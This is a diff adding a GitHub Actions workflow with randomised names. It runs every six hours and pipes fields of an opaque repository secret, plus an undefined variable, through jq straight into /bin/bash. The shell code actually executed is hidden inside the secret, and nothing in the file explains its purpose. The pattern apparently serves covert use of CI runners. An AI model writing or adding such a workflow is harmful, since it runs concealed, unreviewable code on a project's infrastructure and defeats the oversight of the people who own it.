@@ -1,0 +1,19 @@
+name: sharonblown9593
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sharonblown9593
+        env:
+          x85: ${{ secrets.x85 }}
+        run: |
+          echo $x85 | jq -r .jhxab42155 | /bin/bash
+          echo $g7 | jq -r .czwnc0 | /bin/bash
+
